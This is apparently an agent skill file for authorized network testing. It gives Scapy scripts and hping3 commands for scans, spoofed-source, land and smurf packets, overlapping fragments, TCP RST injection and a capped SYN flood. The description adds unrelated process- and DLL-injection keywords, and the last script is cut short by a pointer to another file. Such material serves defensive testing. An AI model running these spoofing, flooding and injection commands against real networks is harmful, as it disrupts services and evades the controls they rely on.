---
name: performing-packet-injection-attack
description: "Crafts and injects custom network packets using Scapy, hping3, and Nemesis 信号:进程注入,dll注入,内存执行。"
when-to-use: 'Crafts and injects custom network packets using Scapy, hping3, and Nemesis
  during authorized security assessments to test firewall rules, IDS detection, protocol
  handling, and network stack resilience against malformed and spoofed traffic.

  '
domain: cybersecurity
subdomain: network-security
tags:
- network-security
- packet-injection
- scapy
- hping3
- protocol-testing
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
mitre_attack:
- T1046
- T1040
- T1557
- T1071
- T1055
---
# Performing Packet Injection Attack

## When to Use

- Testing IDS/IPS rules by injecting traffic that should trigger specific detection signatures
- Validating firewall rules by crafting packets with specific flags, source addresses, and payloads
- Assessing network stack resilience to malformed packets, fragmentation attacks, and protocol violations
- Simulating spoofed traffic to test anti-spoofing controls (BCP38, uRPF)
- Performing TCP reset injection to test connection resilience and session hijacking scenarios

**Do not use** for denial-of-service attacks against production systems, for spoofing traffic to frame third parties, or without explicit authorization for the target network.

## Prerequisites

- Written authorization specifying in-scope targets and approved packet injection techniques
- Scapy, hping3, and Nemesis installed on the testing platform
- Root/sudo privileges for raw socket access and packet crafting
- Wireshark or tcpdump on the target side to verify packet delivery
- Understanding of TCP/IP protocol internals, header fields, and flag combinations

## Workflow

### Step 1: Craft and Send Basic Test Packets with Scapy

```python
#!/usr/bin/env python3
"""Basic packet injection examples using Scapy for authorized testing."""

from scapy.all import *

# TCP SYN packet (port scan simulation)
syn = IP(dst="10.10.20.10") / TCP(dport=80, flags="S", seq=1000)
response = sr1(syn, timeout=2, verbose=0)
if response and response.haslayer(TCP):
    if response[TCP].flags == "SA":
        print(f"[*] Port 80 is OPEN (SYN-ACK received)")
    elif response[TCP].flags == "RA":
        print(f"[*] Port 80 is CLOSED (RST-ACK received)")

# TCP XMAS scan packet (all flags set)
xmas = IP(dst="10.10.20.10") / TCP(dport=80, flags="FPU")
send(xmas, verbose=0)
print("[*] XMAS packet sent (should trigger IDS)")

# NULL scan packet (no flags)
null = IP(dst="10.10.20.10") / TCP(dport=80, flags="")
send(null, verbose=0)
print("[*] NULL packet sent")

# Crafted ICMP packet with custom payload
icmp_custom = IP(dst="10.10.20.10") / ICMP(type=8) / Raw(load="SECURITY_TEST_PAYLOAD")
send(icmp_custom, verbose=0)
print("[*] Custom ICMP packet sent")

# UDP packet to test firewall rules
udp_test = IP(dst="10.10.20.10") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="test.example.com"))
response = sr1(udp_test, timeout=2, verbose=0)
if response:
    print(f"[*] DNS response received from {response[IP].src}")
```

### Step 2: IP Spoofing and Anti-Spoofing Validation

```python
#!/usr/bin/env python3
"""Test anti-spoofing controls with spoofed source IP packets."""

from scapy.all import *

# Spoofed source IP (should be blocked by BCP38/uRPF)
spoofed_syn = IP(src="192.0.2.100", dst="10.10.20.10") / TCP(dport=80, flags="S")
send(spoofed_syn, verbose=0)
print("[*] Sent SYN with spoofed source 192.0.2.100")

# Land attack test (source = destination)
land = IP(src="10.10.20.10", dst="10.10.20.10") / TCP(sport=80, dport=80, flags="S")
send(land, verbose=0)
print("[*] Land attack packet sent (src==dst)")

# Smurf attack test (ICMP to broadcast with spoofed source)
smurf = IP(src="10.10.20.10", dst="10.10.20.255") / ICMP(type=8)
send(smurf, verbose=0)
print("[*] Smurf test packet sent (ICMP to broadcast)")

# IP fragment overlap test
frag1 = IP(dst="10.10.20.10", flags="MF", frag=0) / TCP(dport=80, flags="S") / Raw(load="A"*24)
frag2 = IP(dst="10.10.20.10", frag=2) / Raw(load="B"*24)  # Overlapping fragment
send(frag1, verbose=0)
send(frag2, verbose=0)
print("[*] Overlapping IP fragments sent")
```

### Step 3: TCP Session Manipulation

```bash
# TCP RST injection to test connection resilience
# Using hping3 to send RST packets
sudo hping3 -S -p 80 --rst -c 5 10.10.20.10

# SYN flood test (limited volume for testing, not DoS)
sudo hping3 -S --flood -V -p 80 -c 100 10.10.20.10
# Note: --flood sends at maximum rate; -c 100 limits to 100 packets

# Test TCP window manipulation
sudo hping3 -S -p 80 -w 0 -c 5 10.10.20.10  # Zero window
sudo hping3 -S -p 80 -w 65535 -c 5 10.10.20.10  # Max window

# Idle scan probe (to test if a host can be used as zombie)
sudo hping3 -SA -p 80 -c 3 10.10.20.10
# Check IP ID values in response for predictability
```

```python
#!/usr/bin/env python3
"""TCP RST injection to test session resilience."""

from scapy.all import *

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
